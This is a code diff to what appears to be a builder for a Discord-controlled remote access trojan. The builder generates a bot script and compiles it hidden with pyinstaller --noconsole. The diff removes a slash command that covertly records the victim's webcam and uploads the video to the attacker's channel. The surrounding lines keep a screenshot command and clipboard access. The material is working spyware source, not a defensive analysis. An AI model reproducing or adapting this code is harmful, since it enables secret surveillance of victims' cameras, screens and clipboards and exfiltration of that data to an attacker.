@@ -41,7 +41,6 @@ import logging
 import threading 
 import requests 
 import time 
-import cv2 
 import win32clipboard
 import win32process
 import win32con
@@ -337,30 +336,6 @@ def get_dims(cap, res='1080p'):
     change_res(cap, width, height)
     return width, height
 
-@slash.slash(name="webcam", description="takes a video of their webcam", guild_ids=g)
-async def webcam_command(ctx: SlashContext):
-    if ctx.channel.name == channel_name:
-        await ctx.send("Taking video of webcam. . .")
-        temp = os.path.join(f"{os.getenv('TEMP')}\\\\video.mp4")
-        res = '720p'
-        t_end = time.time() + 2
-
-        cap = cv2.VideoCapture(0)
-        if cap.isOpened():
-            out = cv2.VideoWriter(temp, cv2.VideoWriter_fourcc(*'X264'), 25, get_dims(cap, res))
-            while time.time() < t_end:
-                ret, frame = cap.read()
-                out.write(frame)
-            cap.release()
-            out.release()
-            cv2.destroyAllWindows()
-        else:
-            await ctx.send(f"**{os.getlogin()}'s** has no webcam :/")
-        file = discord.File(temp, filename="video.mp4")
-        await ctx.send("Webcam Video taken!", file=file)
-        os.remove(temp)
-
-
 @slash.slash(name="screenshot", description="take a screenshot", guild_ids=g)
 async def screenshot_command(ctx: SlashContext):
     if ctx.channel.name == channel_name:
@@ -636,7 +611,7 @@ client.run(token)""".replace("~~TOKENHERE~~'", tokenbot + "'; g = [" + guildid +
 
             print(f'File creation...')
             time.sleep(1)
-            os.system(f"pyinstaller --noconsole -y -F -w --hidden -import cv2 output/{fileName}.py")
+            os.system(f"pyinstaller --noconsole -y -F -w output/{fileName}.py")
             clear()
             print(f'Cleaning up old files...')
             time.sleep(1)
